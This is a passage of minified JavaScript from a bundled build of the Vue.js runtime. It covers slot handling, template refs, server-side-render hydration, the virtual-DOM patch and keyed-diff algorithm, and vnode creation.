  nm = (e, t, n) => {
    if (t._n) return t;
    const o = Fa((...i) => Ua(t(...i)), n);
    return (o._c = !1), o;
  },
  ad = (e, t, n) => {
    const o = e._ctx;
    for (const i in e) {
      if (sd(i)) continue;
      const a = e[i];
      if (Ae(a)) t[i] = nm(0, a, o);
      else if (null != a) {
        const u = Ua(a);
        t[i] = () => u;
      }
    }
  },
  ld = (e, t) => {
    const n = Ua(t);
    e.slots.default = () => n;
  },
  om = (e, t) => {
    if (32 & e.vnode.shapeFlag) {
      const n = t._;
      n ? ((e.slots = Ge(t)), rr(t, "_", n)) : ad(t, (e.slots = {}));
    } else (e.slots = {}), t && ld(e, t);
    rr(e.slots, Wr, 1);
  },
  im = (e, t, n) => {
    const { vnode: o, slots: i } = e;
    let a = !0,
      u = Je;
    if (32 & o.shapeFlag) {
      const f = t._;
      f
        ? n && 1 === f
          ? (a = !1)
          : (rt(i, t), !n && 1 === f && delete i._)
        : ((a = !t.$stable), ad(t, i)),
        (u = t);
    } else t && (ld(e, t), (u = { default: 1 }));
    if (a) for (const f in i) !sd(f) && null == u[f] && delete i[f];
  };
function dr(e, t, n, o, i = !1) {
  if (ye(e))
    return void e.forEach((x, k) => dr(x, t && (ye(t) ? t[k] : t), n, o, i));
  if (So(o) && !i) return;
  const a = 4 & o.shapeFlag ? Gr(o.component) || o.component.proxy : o.el,
    u = i ? null : a,
    { i: f, r: p } = e,
    v = t && t.r,
    y = f.refs === Je ? (f.refs = {}) : f.refs,
    w = f.setupState;
  if (
    (null != v &&
      v !== p &&
      (Ze(v)
        ? ((y[v] = null), We(w, v) && (w[v] = null))
        : $e(v) && (v.value = null)),
    Ae(p))
  )
    Ln(p, f, 12, [u, y]);
  else {
    const x = Ze(p),
      k = $e(p);
    if (x || k) {
      const D = () => {
        if (e.f) {
          const G = x ? (We(w, p) ? w[p] : y[p]) : p.value;
          i
            ? ye(G) && Sa(G, a)
            : ye(G)
            ? G.includes(a) || G.push(a)
            : x
            ? ((y[p] = [a]), We(w, p) && (w[p] = y[p]))
            : ((p.value = [a]), e.k && (y[e.k] = p.value));
        } else
          x
            ? ((y[p] = u), We(w, p) && (w[p] = u))
            : k && ((p.value = u), e.k && (y[e.k] = u));
      };
      u ? ((D.id = -1), ht(D, n)) : D();
    }
  }
}
let Tn = !1;
const rm = (e) =>
    e.namespaceURI.includes("svg") && "foreignObject" !== e.tagName,
  sm = (e) => e.namespaceURI.includes("MathML"),
  Ji = (e) => (rm(e) ? "svg" : sm(e) ? "mathml" : void 0),
  zi = (e) => 8 === e.nodeType;
function am(e) {
  const {
      mt: t,
      p: n,
      o: {
        patchProp: o,
        createText: i,
        nextSibling: a,
        parentNode: u,
        remove: f,
        insert: p,
        createComment: v,
      },
    } = e,
    w = (E, C, I, W, M, U = !1) => {
      const B = zi(E) && "[" === E.data,
        $ = () => G(E, C, I, W, M, B),
        { type: Pe, ref: pe, shapeFlag: Ce, patchFlag: Oe } = C;
      let Se = E.nodeType;
      (C.el = E), -2 === Oe && ((U = !1), (C.dynamicChildren = null));
      let Z = null;
      switch (Pe) {
        case Io:
          3 !== Se
            ? "" === C.children
              ? (p((C.el = i("")), u(E), E), (Z = E))
              : (Z = $())
            : (E.data !== C.children && ((Tn = !0), (E.data = C.children)),
              (Z = a(E)));
          break;
        case Nt:
          te(E)
            ? ((Z = a(E)), ie((C.el = E.content.firstChild), E, I))
            : (Z = 8 !== Se || B ? $() : a(E));
          break;
        case ei:
          if ((B && (Se = (E = a(E)).nodeType), 1 === Se || 3 === Se)) {
            Z = E;
            const we = !C.children.length;
            for (let ue = 0; ue < C.staticCount; ue++)
              we && (C.children += 1 === Z.nodeType ? Z.outerHTML : Z.data),
                ue === C.staticCount - 1 && (C.anchor = Z),
                (Z = a(Z));
            return B ? a(Z) : Z;
          }
          $();
          break;
        case ot:
          Z = B ? D(E, C, I, W, M, U) : $();
          break;
        default:
          if (1 & Ce)
            Z =
              (1 === Se && C.type.toLowerCase() === E.tagName.toLowerCase()) ||
              te(E)
                ? x(E, C, I, W, M, U)
                : $();
          else if (6 & Ce) {
            C.slotScopeIds = M;
            const we = u(E);
            if (
              ((Z = B
                ? q(E)
                : zi(E) && "teleport start" === E.data
                ? q(E, E.data, "teleport end")
                : a(E)),
              t(C, we, null, I, W, Ji(we), U),
              So(C))
            ) {
              let ue;
              B
                ? ((ue = Qe(ot)),
                  (ue.anchor = Z ? Z.previousSibling : we.lastChild))
                : (ue = 3 === E.nodeType ? mi("") : Qe("div")),
                (ue.el = E),
                (C.component.subTree = ue);
            }
          } else
            64 & Ce
              ? (Z = 8 !== Se ? $() : C.type.hydrate(E, C, I, W, M, U, e, k))
              : 128 & Ce &&
                (Z = C.type.hydrate(E, C, I, W, Ji(u(E)), M, U, e, w));
      }
      return null != pe && dr(pe, null, W, C), Z;
    },
    x = (E, C, I, W, M, U) => {
      U = U || !!C.dynamicChildren;
      const {
          type: B,
          props: $,
          patchFlag: Pe,
          shapeFlag: pe,
          dirs: Ce,
          transition: Oe,
        } = C,
        Se = "input" === B || "option" === B;
      if (Se || -1 !== Pe) {
        Ce && Ut(C, null, I, "created");
        let we,
          Z = !1;
        if (te(E)) {
          Z = ud(W, Oe) && I && I.vnode.props && I.vnode.props.appear;
          const ue = E.content.firstChild;
          Z && Oe.beforeEnter(ue), ie(ue, E, I), (C.el = E = ue);
        }
        if (16 & pe && (!$ || (!$.innerHTML && !$.textContent))) {
          let ue = k(E.firstChild, C, E, I, W, M, U);
          for (; ue; ) {
            Tn = !0;
            const et = ue;
            (ue = ue.nextSibling), f(et);
          }
        } else
          8 & pe &&
            E.textContent !== C.children &&
            ((Tn = !0), (E.textContent = C.children));
        if ($)
          if (Se || !U || 48 & Pe)
            for (const ue in $)
              ((Se && (ue.endsWith("value") || "indeterminate" === ue)) ||
                (pi(ue) && !xo(ue)) ||
                "." === ue[0]) &&
                o(E, ue, null, $[ue], void 0, void 0, I);
          else $.onClick && o(E, "onClick", null, $.onClick, void 0, void 0, I);
        (we = $ && $.onVnodeBeforeMount) && St(we, I, C),
          Ce && Ut(C, null, I, "beforeMount"),
          ((we = $ && $.onVnodeMounted) || Ce || Z) &&
            Vu(() => {
              we && St(we, I, C),
                Z && Oe.enter(E),
                Ce && Ut(C, null, I, "mounted");
            }, W);
      }
      return E.nextSibling;
    },
    k = (E, C, I, W, M, U, B) => {
      B = B || !!C.dynamicChildren;
      const $ = C.children,
        Pe = $.length;
      for (let pe = 0; pe < Pe; pe++) {
        const Ce = B ? $[pe] : ($[pe] = Tt($[pe]));
        if (E) E = w(E, Ce, W, M, U, B);
        else {
          if (Ce.type === Io && !Ce.children) continue;
          (Tn = !0), n(null, Ce, I, null, W, M, Ji(I), U);
        }
      }
      return E;
    },
    D = (E, C, I, W, M, U) => {
      const { slotScopeIds: B } = C;
      B && (M = M ? M.concat(B) : B);
      const $ = u(E),
        Pe = k(a(E), C, $, I, W, M, U);
      return Pe && zi(Pe) && "]" === Pe.data
        ? a((C.anchor = Pe))
        : ((Tn = !0), p((C.anchor = v("]")), $, Pe), Pe);
    },
    G = (E, C, I, W, M, U) => {
      if (((Tn = !0), (C.el = null), U)) {
        const Pe = q(E);
        for (;;) {
          const pe = a(E);
          if (!pe || pe === Pe) break;
          f(pe);
        }
      }
      const B = a(E),
        $ = u(E);
      return f(E), n(null, C, $, B, I, W, Ji($), M), B;
    },
    q = (E, C = "[", I = "]") => {
      let W = 0;
      for (; E; )
        if ((E = a(E)) && zi(E) && (E.data === C && W++, E.data === I)) {
          if (0 === W) return a(E);
          W--;
        }
      return E;
    },
    ie = (E, C, I) => {
      const W = C.parentNode;
      W && W.replaceChild(E, C);
      let M = I;
      for (; M; )
        M.vnode.el === C && (M.vnode.el = M.subTree.el = E), (M = M.parent);
    },
    te = (E) => 1 === E.nodeType && "template" === E.tagName.toLowerCase();
  return [
    (E, C) => {
      if (!C.hasChildNodes()) return n(null, E, C), lr(), void (C._vnode = E);
      (Tn = !1),
        w(C.firstChild, E, null, null, null),
        lr(),
        (C._vnode = E),
        Tn && console.error("Hydration completed but contains mismatches.");
    },
    w,
  ];
}
const ht = Vu;
function lm(e) {
  return cd(e);
}
function cm(e) {
  return cd(e, am);
}
function cd(e, t) {
  vu().__VUE__ = !0;
  const {
      insert: o,
      remove: i,
      patchProp: a,
      createElement: u,
      createText: f,
      createComment: p,
      setText: v,
      setElementText: y,
      parentNode: w,
      nextSibling: x,
      setScopeId: k = Et,
      insertStaticContent: D,
    } = e,
    G = (
      _,
      S,
      R,
      F = null,
      j = null,
      Q = null,
      K = void 0,
      V = null,
      X = !!S.dynamicChildren
    ) => {
      if (_ === S) return;
      _ && !Rn(_, S) && ((F = Un(_)), yt(_, j, Q, !0), (_ = null)),
        -2 === S.patchFlag && ((X = !1), (S.dynamicChildren = null));
      const { type: z, ref: oe, shapeFlag: de } = S;
      switch (z) {
        case Io:
          q(_, S, R, F);
          break;
        case Nt:
          ie(_, S, R, F);
          break;
        case ei:
          null == _ && te(S, R, F, K);
          break;
        case ot:
          pe(_, S, R, F, j, Q, K, V, X);
          break;
        default:
          1 & de
            ? I(_, S, R, F, j, Q, K, V, X)
            : 6 & de
            ? Ce(_, S, R, F, j, Q, K, V, X)
            : (64 & de || 128 & de) && z.process(_, S, R, F, j, Q, K, V, X, $t);
      }
      null != oe && j && dr(oe, _ && _.ref, Q, S || _, !S);
    },
    q = (_, S, R, F) => {
      if (null == _) o((S.el = f(S.children)), R, F);
      else {
        const j = (S.el = _.el);
        S.children !== _.children && v(j, S.children);
      }
    },
    ie = (_, S, R, F) => {
      null == _ ? o((S.el = p(S.children || "")), R, F) : (S.el = _.el);
    },
    te = (_, S, R, F) => {
      [_.el, _.anchor] = D(_.children, S, R, F, _.el, _.anchor);
    },
    I = (_, S, R, F, j, Q, K, V, X) => {
      "svg" === S.type ? (K = "svg") : "math" === S.type && (K = "mathml"),
        null == _ ? W(S, R, F, j, Q, K, V, X) : B(_, S, j, Q, K, V, X);
    },
    W = (_, S, R, F, j, Q, K, V) => {
      let X, z;
      const { props: oe, shapeFlag: de, transition: le, dirs: he } = _;
      if (
        ((X = _.el = u(_.type, Q, oe && oe.is, oe)),
        8 & de
          ? y(X, _.children)
          : 16 & de && U(_.children, X, null, F, j, Is(_, Q), K, V),
        he && Ut(_, null, F, "created"),
        M(X, _, _.scopeId, K, F),
        oe)
      ) {
        for (const Fe in oe)
          "value" !== Fe &&
            !xo(Fe) &&
            a(X, Fe, null, oe[Fe], Q, _.children, F, j, wt);
        "value" in oe && a(X, "value", null, oe.value, Q),
          (z = oe.onVnodeBeforeMount) && St(z, F, _);
      }
      he && Ut(_, null, F, "beforeMount");
      const Te = ud(j, le);
      Te && le.beforeEnter(X),
        o(X, S, R),
        ((z = oe && oe.onVnodeMounted) || Te || he) &&
          ht(() => {
            z && St(z, F, _),
              Te && le.enter(X),
              he && Ut(_, null, F, "mounted");
          }, j);
    },
    M = (_, S, R, F, j) => {
      if ((R && k(_, R), F)) for (let Q = 0; Q < F.length; Q++) k(_, F[Q]);
      if (j) {
        if (S === j.subTree) {
          const K = j.vnode;
          M(_, K, K.scopeId, K.slotScopeIds, j.parent);
        }
      }
    },
    U = (_, S, R, F, j, Q, K, V, X = 0) => {
      for (let z = X; z < _.length; z++) {
        const oe = (_[z] = V ? In(_[z]) : Tt(_[z]));
        G(null, oe, S, R, F, j, Q, K, V);
      }
    },
    B = (_, S, R, F, j, Q, K) => {
      const V = (S.el = _.el);
      let { patchFlag: X, dynamicChildren: z, dirs: oe } = S;
      X |= 16 & _.patchFlag;
      const de = _.props || Je,
        le = S.props || Je;
      let he;
      if (
        (R && Xn(R, !1),
        (he = le.onVnodeBeforeUpdate) && St(he, R, S, _),
        oe && Ut(S, _, R, "beforeUpdate"),
        R && Xn(R, !0),
        z
          ? $(_.dynamicChildren, z, V, R, F, Is(S, j), Q)
          : K || ue(_, S, V, null, R, F, Is(S, j), Q, !1),
        X > 0)
      ) {
        if (16 & X) Pe(V, S, de, le, R, F, j);
        else if (
          (2 & X && de.class !== le.class && a(V, "class", null, le.class, j),
          4 & X && a(V, "style", de.style, le.style, j),
          8 & X)
        ) {
          const Te = S.dynamicProps;
          for (let Fe = 0; Fe < Te.length; Fe++) {
            const Be = Te[Fe],
              Xe = de[Be],
              ct = le[Be];
            (ct !== Xe || "value" === Be) &&
              a(V, Be, Xe, ct, j, _.children, R, F, wt);
          }
        }
        1 & X && _.children !== S.children && y(V, S.children);
      } else !K && null == z && Pe(V, S, de, le, R, F, j);
      ((he = le.onVnodeUpdated) || oe) &&
        ht(() => {
          he && St(he, R, S, _), oe && Ut(S, _, R, "updated");
        }, F);
    },
    $ = (_, S, R, F, j, Q, K) => {
      for (let V = 0; V < S.length; V++) {
        const X = _[V],
          z = S[V],
          oe =
            X.el && (X.type === ot || !Rn(X, z) || 70 & X.shapeFlag)
              ? w(X.el)
              : R;
        G(X, z, oe, null, F, j, Q, K, !0);
      }
    },
    Pe = (_, S, R, F, j, Q, K) => {
      if (R !== F) {
        if (R !== Je)
          for (const V in R)
            !xo(V) && !(V in F) && a(_, V, R[V], null, K, S.children, j, Q, wt);
        for (const V in F) {
          if (xo(V)) continue;
          const X = F[V],
            z = R[V];
          X !== z && "value" !== V && a(_, V, z, X, K, S.children, j, Q, wt);
        }
        "value" in F && a(_, "value", R.value, F.value, K);
      }
    },
    pe = (_, S, R, F, j, Q, K, V, X) => {
      const z = (S.el = _ ? _.el : f("")),
        oe = (S.anchor = _ ? _.anchor : f(""));
      let { patchFlag: de, dynamicChildren: le, slotScopeIds: he } = S;
      he && (V = V ? V.concat(he) : he),
        null == _
          ? (o(z, R, F), o(oe, R, F), U(S.children || [], R, oe, j, Q, K, V, X))
          : de > 0 && 64 & de && le && _.dynamicChildren
          ? ($(_.dynamicChildren, le, R, j, Q, K, V),
            (null != S.key || (j && S === j.subTree)) && dd(_, S, !0))
          : ue(_, S, R, oe, j, Q, K, V, X);
    },
    Ce = (_, S, R, F, j, Q, K, V, X) => {
      (S.slotScopeIds = V),
        null == _
          ? 512 & S.shapeFlag
            ? j.ctx.activate(S, R, F, K, X)
            : Oe(S, R, F, j, Q, K, X)
          : Se(_, S, X);
    },
    Oe = (_, S, R, F, j, Q, K) => {
      const V = (_.component = mm(_, F, j));
      if ((Ja(_) && (V.ctx.renderer = $t), ym(V), V.asyncDep)) {
        if ((j && j.registerDep(V, Z), !_.el)) {
          const X = (V.subTree = Qe(Nt));
          ie(null, X, S, R);
        }
      } else Z(V, _, S, R, j, Q, K);
    },
    Se = (_, S, R) => {
      const F = (S.component = _.component);
      if (Pg(_, S, R)) {
        if (F.asyncDep && !F.asyncResolved) return void we(F, S, R);
        (F.next = S), yg(F.update), (F.effect.dirty = !0), F.update();
      } else (S.el = _.el), (F.vnode = S);
    },
    Z = (_, S, R, F, j, Q, K) => {
      const V = () => {
          if (_.isMounted) {
            let { next: oe, bu: de, u: le, parent: he, vnode: Te } = _;
            {
              const Yt = fd(_);
              if (Yt)
                return (
                  oe && ((oe.el = Te.el), we(_, oe, K)),
                  void Yt.asyncDep.then(() => {
                    _.isUnmounted || V();
                  })
                );
            }
            let Be,
              Fe = oe;
            Xn(_, !1),
              oe ? ((oe.el = Te.el), we(_, oe, K)) : (oe = Te),
              de && Qi(de),
              (Be = oe.props && oe.props.onVnodeBeforeUpdate) &&
                St(Be, he, oe, Te),
              Xn(_, !0);
            const Xe = Ts(_),
              ct = _.subTree;
            (_.subTree = Xe),
              G(ct, Xe, w(ct.el), Un(ct), _, j, Q),
              (oe.el = Xe.el),
              null === Fe && La(_, Xe.el),
              le && ht(le, j),
              (Be = oe.props && oe.props.onVnodeUpdated) &&
                ht(() => St(Be, he, oe, Te), j);
          } else {
            let oe;
            const { el: de, props: le } = S,
              { bm: he, m: Te, parent: Fe } = _,
              Be = So(S);
            if (
              (Xn(_, !1),
              he && Qi(he),
              !Be && (oe = le && le.onVnodeBeforeMount) && St(oe, Fe, S),
              Xn(_, !0),
              de && wn)
            ) {
              const Xe = () => {
                (_.subTree = Ts(_)), wn(de, _.subTree, _, j, null);
              };
              Be
                ? S.type.__asyncLoader().then(() => !_.isUnmounted && Xe())
                : Xe();
            } else {
              const Xe = (_.subTree = Ts(_));
              G(null, Xe, R, F, _, j, Q), (S.el = Xe.el);
            }
            if ((Te && ht(Te, j), !Be && (oe = le && le.onVnodeMounted))) {
              const Xe = S;
              ht(() => St(oe, Fe, Xe), j);
            }
            (256 & S.shapeFlag ||
              (Fe && So(Fe.vnode) && 256 & Fe.vnode.shapeFlag)) &&
              _.a &&
              ht(_.a, j),
              (_.isMounted = !0),
              (S = R = F = null);
          }
        },
        X = (_.effect = new Ea(V, Et, () => Ir(z), _.scope)),
        z = (_.update = () => {
          X.dirty && X.run();
        });
      (z.id = _.uid), Xn(_, !0), z();
    },
    we = (_, S, R) => {
      S.component = _;
      const F = _.vnode.props;
      (_.vnode = S),
        (_.next = null),
        tm(_, S.props, F, R),
        im(_, S.children, R),
        ao(),
        hc(_),
        lo();
    },
    ue = (_, S, R, F, j, Q, K, V, X = !1) => {
      const z = _ && _.children,
        oe = _ ? _.shapeFlag : 0,
        de = S.children,
        { patchFlag: le, shapeFlag: he } = S;
      if (le > 0) {
        if (128 & le) return void vt(z, de, R, F, j, Q, K, V, X);
        if (256 & le) return void et(z, de, R, F, j, Q, K, V, X);
      }
      8 & he
        ? (16 & oe && wt(z, j, Q), de !== z && y(R, de))
        : 16 & oe
        ? 16 & he
          ? vt(z, de, R, F, j, Q, K, V, X)
          : wt(z, j, Q, !0)
        : (8 & oe && y(R, ""), 16 & he && U(de, R, F, j, Q, K, V, X));
    },
    et = (_, S, R, F, j, Q, K, V, X) => {
      S = S || bo;
      const z = (_ = _ || bo).length,
        oe = S.length,
        de = Math.min(z, oe);
      let le;
      for (le = 0; le < de; le++) {
        const he = (S[le] = X ? In(S[le]) : Tt(S[le]));
        G(_[le], he, R, null, j, Q, K, V, X);
      }
      z > oe ? wt(_, j, Q, !0, !1, de) : U(S, R, F, j, Q, K, V, X, de);
    },
    vt = (_, S, R, F, j, Q, K, V, X) => {
      let z = 0;
      const oe = S.length;
      let de = _.length - 1,
        le = oe - 1;
      for (; z <= de && z <= le; ) {
        const he = _[z],
          Te = (S[z] = X ? In(S[z]) : Tt(S[z]));
        if (!Rn(he, Te)) break;
        G(he, Te, R, null, j, Q, K, V, X), z++;
      }
      for (; z <= de && z <= le; ) {
        const he = _[de],
          Te = (S[le] = X ? In(S[le]) : Tt(S[le]));
        if (!Rn(he, Te)) break;
        G(he, Te, R, null, j, Q, K, V, X), de--, le--;
      }
      if (z > de) {
        if (z <= le) {
          const he = le + 1,
            Te = he < oe ? S[he].el : F;
          for (; z <= le; )
            G(null, (S[z] = X ? In(S[z]) : Tt(S[z])), R, Te, j, Q, K, V, X),
              z++;
        }
      } else if (z > le) for (; z <= de; ) yt(_[z], j, Q, !0), z++;
      else {
        const he = z,
          Te = z,
          Fe = new Map();
        for (z = Te; z <= le; z++) {
          const st = (S[z] = X ? In(S[z]) : Tt(S[z]));
          null != st.key && Fe.set(st.key, z);
        }
        let Be,
          Xe = 0;
        const ct = le - Te + 1;
        let Yt = !1,
          Jo = 0;
        const An = new Array(ct);
        for (z = 0; z < ct; z++) An[z] = 0;
        for (z = he; z <= de; z++) {
          const st = _[z];
          if (Xe >= ct) {
            yt(st, j, Q, !0);
            continue;
          }
          let At;
          if (null != st.key) At = Fe.get(st.key);
          else
            for (Be = Te; Be <= le; Be++)
              if (0 === An[Be - Te] && Rn(st, S[Be])) {
                At = Be;
                break;
              }
          void 0 === At
            ? yt(st, j, Q, !0)
            : ((An[At - Te] = z + 1),
              At >= Jo ? (Jo = At) : (Yt = !0),
              G(st, S[At], R, null, j, Q, K, V, X),
              Xe++);
        }
        const Hn = Yt ? um(An) : bo;
        for (Be = Hn.length - 1, z = ct - 1; z >= 0; z--) {
          const st = Te + z,
            At = S[st],
            bn = st + 1 < oe ? S[st + 1].el : F;
          0 === An[z]
            ? G(null, At, R, bn, j, Q, K, V, X)
            : Yt && (Be < 0 || z !== Hn[Be] ? Wt(At, R, bn, 2) : Be--);
        }
      }
    },
    Wt = (_, S, R, F, j = null) => {
      const { el: Q, type: K, transition: V, children: X, shapeFlag: z } = _;
      if (6 & z) Wt(_.component.subTree, S, R, F);
      else if (128 & z) _.suspense.move(S, R, F);
      else if (64 & z) K.move(_, S, R, $t);
      else if (K !== ot)
        if (K !== ei)
          if (2 !== F && 1 & z && V)
            if (0 === F) V.beforeEnter(Q), o(Q, S, R), ht(() => V.enter(Q), j);
            else {
              const { leave: de, delayLeave: le, afterLeave: he } = V,
                Te = () => o(Q, S, R),
                Fe = () => {
                  de(Q, () => {
                    Te(), he && he();
                  });
                };
              le ? le(Q, Te, Fe) : Fe();
            }
          else o(Q, S, R);
        else
          (({ el: _, anchor: S }, R, F) => {
            let j;
            for (; _ && _ !== S; ) (j = x(_)), o(_, R, F), (_ = j);
            o(S, R, F);
          })(_, S, R);
      else {
        o(Q, S, R);
        for (let de = 0; de < X.length; de++) Wt(X[de], S, R, F);
        o(_.anchor, S, R);
      }
    },
    yt = (_, S, R, F = !1, j = !1) => {
      const {
        type: Q,
        props: K,
        ref: V,
        children: X,
        dynamicChildren: z,
        shapeFlag: oe,
        patchFlag: de,
        dirs: le,
      } = _;
      if ((null != V && dr(V, null, R, _, !0), 256 & oe))
        return void S.ctx.deactivate(_);
      const he = 1 & oe && le,
        Te = !So(_);
      let Fe;
      if ((Te && (Fe = K && K.onVnodeBeforeUnmount) && St(Fe, S, _), 6 & oe))
        Bo(_.component, R, F);
      else {
        if (128 & oe) return void _.suspense.unmount(R, F);
        he && Ut(_, null, S, "beforeUnmount"),
          64 & oe
            ? _.type.remove(_, S, R, j, $t, F)
            : z && (Q !== ot || (de > 0 && 64 & de))
            ? wt(z, S, R, !1, !0)
            : ((Q === ot && 384 & de) || (!j && 16 & oe)) && wt(X, S, R),
          F && fo(_);
      }
      ((Te && (Fe = K && K.onVnodeUnmounted)) || he) &&
        ht(() => {
          Fe && St(Fe, S, _), he && Ut(_, null, S, "unmounted");
        }, R);
    },
    fo = (_) => {
      const { type: S, el: R, anchor: F, transition: j } = _;
      if (S === ot) return void Si(R, F);
      if (S === ei)
        return void (({ el: _, anchor: S }) => {
          let R;
          for (; _ && _ !== S; ) (R = x(_)), i(_), (_ = R);
          i(S);
        })(_);
      const Q = () => {
        i(R), j && !j.persisted && j.afterLeave && j.afterLeave();
      };
      if (1 & _.shapeFlag && j && !j.persisted) {
        const { leave: K, delayLeave: V } = j,
          X = () => K(R, Q);
        V ? V(_.el, Q, X) : X();
      } else Q();
    },
    Si = (_, S) => {
      let R;
      for (; _ !== S; ) (R = x(_)), i(_), (_ = R);
      i(S);
    },
    Bo = (_, S, R) => {
      const { bum: F, scope: j, update: Q, subTree: K, um: V } = _;
      F && Qi(F),
        j.stop(),
        Q && ((Q.active = !1), yt(K, _, S, R)),
        V && ht(V, S),
        ht(() => {
          _.isUnmounted = !0;
        }, S),
        S &&
          S.pendingBranch &&
          !S.isUnmounted &&
          _.asyncDep &&
          !_.asyncResolved &&
          _.suspenseId === S.pendingId &&
          (S.deps--, 0 === S.deps && S.resolve());
    },
    wt = (_, S, R, F = !1, j = !1, Q = 0) => {
      for (let K = Q; K < _.length; K++) yt(_[K], S, R, F, j);
    },
    Un = (_) =>
      6 & _.shapeFlag
        ? Un(_.component.subTree)
        : 128 & _.shapeFlag
        ? _.suspense.next()
        : x(_.anchor || _.el);
  let ho = !1;
  const ae = (_, S, R) => {
      null == _
        ? S._vnode && yt(S._vnode, null, null, !0)
        : G(S._vnode || null, _, S, null, null, null, R),
        ho || ((ho = !0), hc(), lr(), (ho = !1)),
        (S._vnode = _);
    },
    $t = {
      p: G,
      um: yt,
      m: Wt,
      r: fo,
      mt: Oe,
      mc: U,
      pc: ue,
      pbc: $,
      n: Un,
      o: e,
    };
  let en, wn;
  return (
    t && ([en, wn] = t($t)), { render: ae, hydrate: en, createApp: $g(ae, en) }
  );
}
function Is({ type: e, props: t }, n) {
  return ("svg" === n && "foreignObject" === e) ||
    ("mathml" === n &&
      "annotation-xml" === e &&
      t &&
      t.encoding &&
      t.encoding.includes("html"))
    ? void 0
    : n;
}
function Xn({ effect: e, update: t }, n) {
  e.allowRecurse = t.allowRecurse = n;
}
function ud(e, t) {
  return (!e || (e && !e.pendingBranch)) && t && !t.persisted;
}
function dd(e, t, n = !1) {
  const o = e.children,
    i = t.children;
  if (ye(o) && ye(i))
    for (let a = 0; a < o.length; a++) {
      const u = o[a];
      let f = i[a];
      1 & f.shapeFlag &&
        !f.dynamicChildren &&
        ((f.patchFlag <= 0 || 32 === f.patchFlag) &&
          ((f = i[a] = In(i[a])), (f.el = u.el)),
        n || dd(u, f)),
        f.type === Io && (f.el = u.el);
    }
}
function um(e) {
  const t = e.slice(),
    n = [0];
  let o, i, a, u, f;
  const p = e.length;
  for (o = 0; o < p; o++) {
    const v = e[o];
    if (0 !== v) {
      if (((i = n[n.length - 1]), e[i] < v)) {
        (t[o] = i), n.push(o);
        continue;
      }
      for (a = 0, u = n.length - 1; a < u; )
        (f = (a + u) >> 1), e[n[f]] < v ? (a = f + 1) : (u = f);
      v < e[n[a]] && (a > 0 && (t[o] = n[a - 1]), (n[a] = o));
    }
  }
  for (a = n.length, u = n[a - 1]; a-- > 0; ) (n[a] = u), (u = t[u]);
  return n;
}
function fd(e) {
  const t = e.subTree.component;
  if (t) return t.asyncDep && !t.asyncResolved ? t : fd(t);
}
const dm = (e) => e.__isTeleport,
  ot = Symbol.for("v-fgt"),
  Io = Symbol.for("v-txt"),
  Nt = Symbol.for("v-cmt"),
  ei = Symbol.for("v-stc"),
  ti = [];
let Dt = null;
function ve(e = !1) {
  ti.push((Dt = e ? null : []));
}
function hd() {
  ti.pop(), (Dt = ti[ti.length - 1] || null);
}
let Oo = 1;
function Sc(e) {
  Oo += e;
}
function pd(e) {
  return (
    (e.dynamicChildren = Oo > 0 ? Dt || bo : null),
    hd(),
    Oo > 0 && Dt && Dt.push(e),
    e
  );
}
function Ie(e, t, n, o, i, a) {
  return pd(L(e, t, n, o, i, a, !0));
}
function Ft(e, t, n, o, i) {
  return pd(Qe(e, t, n, o, i, !0));
}
function ci(e) {
  return !!e && !0 === e.__v_isVNode;
}
function Rn(e, t) {
  return e.type === t.type && e.key === t.key;
}
const Wr = "__vInternal",
  gd = ({ key: e }) => e ?? null,
  qi = ({ ref: e, ref_key: t, ref_for: n }) => (
    "number" == typeof e && (e = "" + e),
    null != e
      ? Ze(e) || $e(e) || Ae(e)
        ? { i: Ke, r: e, k: t, f: !!n }
        : e
      : null
  );
function L(
  e,
  t = null,
  n = null,
  o = 0,
  i = null,
  a = e === ot ? 0 : 1,
  u = !1,
  f = !1
) {
  const p = {
    __v_isVNode: !0,
    __v_skip: !0,
    type: e,
    props: t,
    key: t && gd(t),
    ref: t && qi(t),
    scopeId: Rr,
    slotScopeIds: null,
    children: n,
    component: null,
    suspense: null,
    ssContent: null,
    ssFallback: null,
    dirs: null,
    transition: null,
    el: null,
    anchor: null,
    target: null,
    targetAnchor: null,
    staticCount: 0,
    shapeFlag: a,
    patchFlag: o,
    dynamicProps: i,
    dynamicChildren: null,
    appContext: null,
    ctx: Ke,
  };
  return (
    f
      ? (Ha(p, n), 128 & a && e.normalize(p))
      : n && (p.shapeFlag |= Ze(n) ? 8 : 16),
    Oo > 0 &&
      !u &&
      Dt &&
      (p.patchFlag > 0 || 6 & a) &&
      32 !== p.patchFlag &&
      Dt.push(p),
    p
  );
}
const Qe = fm;
function fm(e, t = null, n = null, o = 0, i = null, a = !1) {
  if (((!e || e === Uu) && (e = Nt), ci(e))) {
    const f = Ro(e, t, !0);
    return (
      n && Ha(f, n),
      Oo > 0 &&
        !a &&
        Dt &&
        (6 & f.shapeFlag ? (Dt[Dt.indexOf(e)] = f) : Dt.push(f)),
      (f.patchFlag |= -2),
      f
    );
  }
  if ((xm(e) && (e = e.__vccOpts), t)) {
    t = md(t);
    let { class: f, style: p } = t;
    f && !Ze(f) && (t.class = gt(f)),
      ze(p) && (Wu(p) && !ye(p) && (p = rt({}, p)), (t.style = Pt(p)));
  }
  return L(
    e,
    t,
    n,
    o,
    i,
    Ze(e) ? 1 : Mg(e) ? 128 : dm(e) ? 64 : ze(e) ? 4 : Ae(e) ? 2 : 0,
    a,
    !0
  );
}
function md(e) {
  return e ? (Wu(e) || Wr in e ? rt({}, e) : e) : null;
}
function Ro(e, t, n = !1) {
  const { props: o, ref: i, patchFlag: a, children: u } = e,
    f = t ? hm(o || {}, t) : o;
  return {
    __v_isVNode: !0,
    __v_skip: !0,
    type: e.type,
    props: f,
    key: f && gd(f),
    ref:
      t && t.ref
        ? n && i
          ? ye(i)
            ? i.concat(qi(t))
            : [i, qi(t)]
          : qi(t)
        : i,
    scopeId: e.scopeId,
    slotScopeIds: e.slotScopeIds,
    children: u,
    target: e.target,
    targetAnchor: e.targetAnchor,
    staticCount: e.staticCount,
    shapeFlag: e.shapeFlag,
    patchFlag: t && e.type !== ot ? (-1 === a ? 16 : 16 | a) : a,
    dynamicProps: e.dynamicProps,
    dynamicChildren: e.dynamicChildren,
    appContext: e.appContext,
    dirs: e.dirs,
    transition: e.transition,
    component: e.component,
    suspense: e.suspense,
    ssContent: e.ssContent && Ro(e.ssContent),
    ssFallback: e.ssFallback && Ro(e.ssFallback),
    el: e.el,
    anchor: e.anchor,
    ctx: e.ctx,
    ce: e.ce,
  };
}
function mi(e = " ", t = 0) {
  return Qe(Io, null, e, t);
}
function Zt(e, t) {
  const n = Qe(ei, null, e);
